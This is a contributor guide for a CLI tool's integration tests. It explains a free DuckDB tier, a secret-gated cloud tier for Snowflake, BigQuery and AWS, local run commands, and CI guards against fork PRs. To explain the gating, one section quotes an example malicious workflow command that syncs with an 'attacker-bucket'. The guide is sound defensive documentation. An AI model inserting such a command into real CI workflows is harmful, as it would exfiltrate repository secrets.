# Integration Testing

This guide covers the integration-test surface for forge-cli — what runs where, how to run it locally, and how cost and security are managed.

> **TL;DR** — Every PR (including from forks) gets free DuckDB end-to-end coverage automatically. Cloud-provider integration (Snowflake / BigQuery / AWS) runs only on maintainer-approved code: post-merge to `main`, on a maintainer-pushed `staging/PR-N` branch, on a nightly cron, or via manual `workflow_dispatch`.

## The two tiers

| Tier | Provider | Where it runs | Triggered by community PRs? | Cost |
|---|---|---|---|---|
| **Tier 1 — Free** | DuckDB / local | `ci.yml::duckdb-integration` | ✅ Yes — every PR including forks | $0 |
| **Tier 2 — Gated** | Snowflake | `integration.yml::snowflake-integration` | ❌ No | ~$0.50 / run |
| **Tier 2 — Gated** | BigQuery | `integration.yml::bigquery-integration` | ❌ No | ~$0.30 / run |
| **Tier 2 — Gated** | AWS Glue | `integration.yml::aws-integration` | ❌ No | ~$0.10 / run |

Tier 2 jobs never run in response to a `pull_request` event from a fork. This is enforced both by the workflow trigger list and by the `actionlint` workflow which fails CI if `pull_request` is ever added to `integration.yml`.

## How fork PRs work safely

GitHub Actions structurally prevents fork PRs from reading repository secrets. When `ci.yml` runs on a fork PR:

- `${{ secrets.SNOWFLAKE_PASSWORD }}` resolves to the empty string
- `${{ secrets.AWS_ACCESS_KEY_ID }}` resolves to the empty string
- Any workflow modification an attacker tries to introduce to exfiltrate secrets simply fails because there are no secrets to exfiltrate

This is a hard platform guarantee, not a configuration knob. forge-cli relies on it to keep `ci.yml` safe to run for every contributor without burning cloud credits.

## Tier 1 — DuckDB end-to-end (the free tier)

What runs (across an OS matrix of Ubuntu, macOS, and Windows):

- `tests/test_e2e_local.py` — full CLI dispatch via `python -m fluid_build.cli`. Tests `fluid init` (quickstart), `fluid validate`, `fluid plan`, scaffold output, plan determinism, and `--help` reachability for **15 documented subcommands** (`init`, `forge`, `validate`, `plan`, `apply`, `policy-check`, `test`, `rollback`, `config`, `ai`, `split`, `auth`, `doctor`, `providers`, `version`).
- `tests/test_e2e_local_apply.py` — exercises `fluid apply` end-to-end and **verifies the materialised output via the DuckDB Python API**: schema (column names), row count, the literal value emitted by the contract's SQL. Catches the `unknown_action_op` shape of regression where apply reports SUCCESS but produces nothing on disk. Also asserts apply-twice succeeds with consistent row count.
- `tests/test_e2e_local_negative.py` — negative-path coverage. Asserts that malformed YAML, contracts missing required schema fields, unsupported `fluidVersion`, and missing contract paths all exit non-zero with informative errors. Proves the system fails *correctly*, not just that it succeeds.
- `tests/providers/test_local_live_happy_path.py` — provider-level happy path against a real DuckDB engine in `tmp_path`.

What this catches that mocked unit tests don't:

- CLI dispatch regressions (a refactor breaks subparser registration; `fluid validate` silently disappears).
- Schema validation regressions when the bundled examples drift from the schema.
- Plan-binding hash drift (two identical `plan` runs should produce identical `planDigest`).
- Apply pipeline regressions where the action dispatcher silently no-ops (the `unknown_action_op` shape).
- Output-format regressions where the writer emits CSV that DuckDB itself can't read back.
- Negative-path regressions where validation accidentally accepts under-specified contracts.
- OS-specific path/encoding regressions on macOS and Windows.
- The "60 Seconds to Magic" promise the README makes — the canonical first-run flow.

How to run locally (single OS):

```bash
pip install -e ".[dev,local]"
pytest -v -m "integration and not slow" \
  tests/test_e2e_local.py \
  tests/test_e2e_local_apply.py \
  tests/test_e2e_local_negative.py \
  tests/providers/test_local_live_happy_path.py
```

No env vars required. Total runtime under 5 minutes per OS.

## Tier 2 — Cloud providers (the gated tier)

### Running locally against your own cloud account

Contributors can validate provider-touching changes against their own dev cloud accounts before opening a PR. The tests are env-gated and skip cleanly when the env vars aren't present.

#### Snowflake

```bash
pip install -e ".[dev,snowflake]"

export SNOWFLAKE_ACCOUNT="myorg-myaccount"
export SNOWFLAKE_USER="forge_ci_test"
export SNOWFLAKE_PASSWORD="..."
export SNOWFLAKE_WAREHOUSE="FORGE_CI_WH"
export SNOWFLAKE_ROLE="FORGE_CI_ROLE"
export FORGE_CI_RUN_TAG="local-$(date +%s)"

pytest -v -m "integration and snowflake" \
  tests/providers/test_snowflake_live_happy_path.py \
  tests/providers/test_snowflake_governance_live.py
```

Use a dedicated Snowflake user/role with minimal privileges (`USAGE` on warehouse, `CREATE DATABASE`/`SCHEMA` only). Never your production credentials.

#### BigQuery

```bash
pip install -e ".[dev,gcp]"

export GOOGLE_APPLICATION_CREDENTIALS="/path/to/forge-ci-sa.json"
export GCP_PROJECT="my-forge-ci-project"
export GCP_LOCATION="US"
export FORGE_CI_RUN_TAG="local-$(date +%s)"

pytest -v -m "integration and gcp" \
  tests/providers/test_bigquery_live_happy_path.py
```

The service account needs `BigQuery Data Owner` on the test project only.

#### AWS Glue

```bash
pip install -e ".[dev,aws]"

# Use AWS SSO or a profile dedicated to forge-ci
export AWS_PROFILE="forge-ci"
export AWS_REGION="us-east-1"
export AWS_GLUE_DATABASE="forge_ci_test"
export FORGE_CI_RUN_TAG="local-$(date +%s)"

pytest -v -m "integration and aws" \
  tests/providers/test_aws_live_happy_path.py
```

The IAM principal needs `glue:CreateTable`, `glue:GetTable`, `glue:DeleteTable`, `glue:GetTags` on the test database only.

### Cost expectations

Per local run (rough order-of-magnitude):

- Snowflake: < $0.10 (XS warehouse, ~5 minutes)
- BigQuery: < $0.05 (one CREATE TABLE, no data)
- AWS Glue: < $0.01 (catalog ops only, no compute)

If your test run exceeds these by 10x or more, something is wrong — most likely the cleanup steps didn't run. Inspect the test output and the cleanup script logs.

### Cleanup

Each test class uses `try/finally` to drop the resources it created, even if an assertion fails mid-test. If a process crash bypasses that, the per-provider cleanup scripts in `scripts/cleanup_*.py` sweep anything tagged `forge_ci=true`. They're idempotent and safe to run repeatedly.

After a local test run, a manual sweep is still good hygiene:

```bash
python scripts/cleanup_snowflake_test_artifacts.py  # uses the same env vars
python scripts/cleanup_bigquery_test_artifacts.py
python scripts/cleanup_aws_test_artifacts.py
```

## How CI enforces the safety properties

The `.github/workflows/actionlint.yml` workflow runs on every push and PR (no secrets needed). It fails CI if:

- Any workflow file uses `pull_request_target:` (the dangerous event that grants secret access on fork PRs)
- `integration.yml` ever lists `pull_request:` as a trigger
- Any third-party action is referenced by floating tag instead of pinned commit SHA (separate `check-pinned-actions.yml` workflow)

This means if a maintainer accidentally introduces a secret-leak shape, CI fails before the change can land on `main`.

## Why we don't run cloud integration on PRs

The straightforward implementation — "run integration tests on every PR" — would let a malicious community PR add `aws sync s3://attacker-bucket/ /tmp/exfil` to the workflow. With our design, that PR's workflow runs without secrets, so the command exits with "Unable to locate credentials" and no money is spent.

This pattern — "free-tier integration on PRs, gated tier on merged code" — is what dbt-core, Apache Airflow, Pulumi, FastAPI, and sqlglot all use. It's the conventional best practice for OSS projects with paid integration testing.

## Triage when integration fails

See [`MAINTAINER_HANDBOOK.md`](MAINTAINER_HANDBOOK.md) for the full triage playbook. The short version:

- Test asserts failed → likely a real bug; bisect on `git log main` to find the offending commit.
- Cleanup script crashed → check `scripts/cleanup_*.py` logs; the daily orphan-sweep cron will catch any leak after 24h.
- API returned 401/403 → credentials rotated; refresh repo secrets.
- API returned 5xx → external provider issue; retry the workflow.
